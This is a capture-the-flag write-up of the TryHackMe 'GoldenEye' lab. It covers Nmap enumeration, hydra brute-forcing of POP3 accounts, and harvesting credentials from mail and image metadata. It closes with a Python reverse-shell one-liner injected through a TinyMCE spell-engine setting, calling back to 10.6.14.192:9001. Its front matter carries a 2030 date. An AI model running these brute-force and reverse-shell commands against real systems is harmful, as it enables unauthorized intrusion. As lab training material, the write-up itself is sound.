---
title: "TryHackMe (THM) - GoldenEye"
description: "?"
date: 2030-10-15 12:00:00 -100
image: /assets/images/THM - GoldenEye/GoldenEye Thumbnail.png
categories: [CTF]
tags: [test]    # TAG names should always be lowercase
---

## Enumeration

Let's run [Nmap](https://nmap.org/book/toc.html) against our target

```bash
nmap -sC -sV -A -p- -o nmap.txt
```

| **Port**  | **Protocol** | **Version**                    |
|-----------|--------------|---------------------------------|
| 25/tcp    | smtp         | Postfix smtpd                  |
| 80/tcp    | http         | Apache httpd 2.4.7 (Ubuntu)    |
| 55006/tcp | ssl/pop3     | Dovecot pop3d                  |
| 55007/tcp | pop3         | Dovecot pop3d                  |

---
**Host:** 10.10.166.56  
**Host Status:** Up (0.11s latency)  
**Closed Ports:** 65531 (conn-refused)  
**Scan Time:** 498.35 seconds  
**Nmap Version:** 7.94SVN  

As always, let's go for the low hanging fruit first and check out the apache web server on port 80

![Web Server](/assets/images/THM%20-%20GoldenEye/Web%20Server.png)

The landing page tells us to navigate to `/sec-home/` to login. Let's crawl the site a bit

Viewing the source code reveals a JavaScript file `terminal.js` that reveals some important information

![Source Code](/assets/images/THM%20-%20GoldenEye/Source%20Code%20JS.png)

| **Category**               | **Details**                                                                 |
|----------------------------|------------------------------------------------------------------------------|
| Server Name                | GOLDENEYE                                                                    |
| User Hint                  | UNKNOWN                                                                      |
| Login Directory            | /sev-home/                                                                   |
| Security Warning           | MI6 may try to infiltrate, monitor network traffic for suspicious activity.  |
| Encoded Password           | `&#73;&#110;&#118;&#105;&#110;&#99;&#105;&#98;&#108;&#101;&#72;&#97;&#99;&#107;&#51;&#114;` |
| Password Decoded           | `InvincibleHack3r`                                                             |
| Note to Boris              | Update default password.                                                     |
| Comment from Natalya       | She can break Boris's codes.                                                 |

The HTML decoding of the password reveals `InvincibleHack3r` as noted above

Let's navigate to the `/sev-home/` directory as instructed earlier & login with the username `boris` and the password 

![Login Page Hint](/assets/images/THM%20-%20GoldenEye/Login%20page%20hint.png)

We get a message telling us to to interact with the POP3 service to access further parts of the system, which happens to be running on a high non-standard port

Unfortunately, the password `InvincibleHack3r` isn't a valid login to the email server on `55007`

We can try to brute force the password with hydra

```bash
hydra -l boris -P /usr/share/wordlists/fasttrack.txt 10.10.120.144 -s 55007 pop3 -f -o found_password.txt -t 4 -w 1 -V
```

![Pass Discoverd](/assets/images/THM%20-%20GoldenEye/pass%20discovered.png)

We discover the password for boris on the mail server is `secret1!`

```bash
telnet 10.10.120.144 55007
```

![Emails](/assets/images/THM%20-%20GoldenEye/Emails.png)

We're able to read three emails, revealing the following information

| **Message ID** | **Sender**             | **Recipient** | **Date**                | **Summary / Content**                                                                                                   |
|----------------|------------------------|---------------|-------------------------|-------------------------------------------------------------------------------------------------------------------------|
| 1              | root@127.0.0.1.goldeneye | boris        | Tue, 2 Apr 1990 19:22:14 PDT | Admin (root) informs Boris that emails won’t be scanned for security risks, trusting Boris and other admins.             |
| 2              | natalya@ubuntu         | boris         | Tue, 21 Apr 1995 19:42:35 PDT | Natalya warns Boris that she can **break his codes**, possibly signaling conflict.                                      |
| 3              | alec@janus.boss        | boris         | Wed, 22 Apr 1995 19:51:48 PDT | Alec provides **access codes for GoldenEye** and asks Boris to hide them securely. He mentions `Xenia`, a key figure, who will gain access to the GoldenEye Terminal codes in the plan’s final stages. |

We find some names, `alec`, `Xenia`, and `natalya`. Let's attempt to bruce force their passwords

```bash
hydra -l <username> -P /path/to/wordlist.txt 10.10.120.144  -s -f 55007 pop3
```

![Natalya Pass](/assets/images/THM%20-%20GoldenEye/Natalya%20password.png)

We crack Natalyas password as `bird`. Logging into the email server as natalya yields two emails and some important information


## Email Summary (Important Information)

### RETR 2
- **From:** root@ubuntu  
- **To:** natalya@ubuntu  
- **Date:** Tue, 29 Apr 1995 20:19:42 -0700 (PDT)  
- **Message:**  
  - Create account for **Xenia** with the following credentials:
    - **Username:** xenia  
    - **Password:** `RCP90rulez!`
  - Modify `/etc/hosts` to map the internal domain to server IP:
    - Example: `10.10.10.10 severnaya-station.com`
  - **URL:** `http://severnaya-station.com/gnocertdir`  
  - **Security Insight:** Use "security" as an excuse to escalate change orders.

Our next steps are adding the name for this vhost `servernaya-station.com` to our local DNS file

Now lets' navigate to `servernaya-station.com/gnocertdir` as mentioned in the email

![New Domain](/assets/images/THM%20-%20GoldenEye/servernaya.png)

We're able to login as xenia here with the password obtained earlier

Taking a look around, I notice a `messages` section

![Doak User](/assets/images/THM%20-%20GoldenEye/Message.png)

We discover another user by the name of `doak`. Let's try to brute force this user aganist the pop3 server as well

![Doak Password](/assets/images/THM%20-%20GoldenEye/doak%20password.png)

We discover that Doaks password is `goat`

Going into doaks emails, we retrieve a message telling us to login to the training site with yet even more credentials

userrname: `dr_doak`
password: `4England!`

![Secret File](/assets/images/THM%20-%20GoldenEye/secret%20file.png)

Logging into the training site as dr_doak, we see that there's a file

![Note](/assets/images/Other/Note.png)

The note explains that admin credentials were captured in clear-text as well as mentioning that ***something juicy*** is located at `/dir007key/for-007.jpg`

Let's navigate to that directory

![Secret Directory](/assets/images/THM%20-%20GoldenEye/Secret%20Directory.png)

Let's download this picture and run `exiftool` on it to extract the metadata

![Metadata](/assets/images/THM%20-%20GoldenEye/Metadata.png)

This string for Image Description appears to be base64. Let's decode this.

```bash
echo "eFdpbnRlcjE5OTV4IQ==" | base64 -d
```

![Decoded](/assets/images/THM%20-%20GoldenEye/Decoded.png)

We discover that the admin password is `xWinter1995x!`

Let's login as admin

![Admin Settings](/assets/images/THM%20-%20GoldenEye/System%20Admin%20Settings.png)

We see that we have access to some admin settings

![Path to injection](/assets/images/THM%20-%20GoldenEye/Injection.png)

Let's try editing this command to be a reverse shell

```input
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.6.14.192",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

Now we have to set the "spell engine" part to PSpellShell in the TinyMCE editor to trigger the payload

![Settings](/assets/images/THM%20-%20GoldenEye/Spell%20Engine.png)

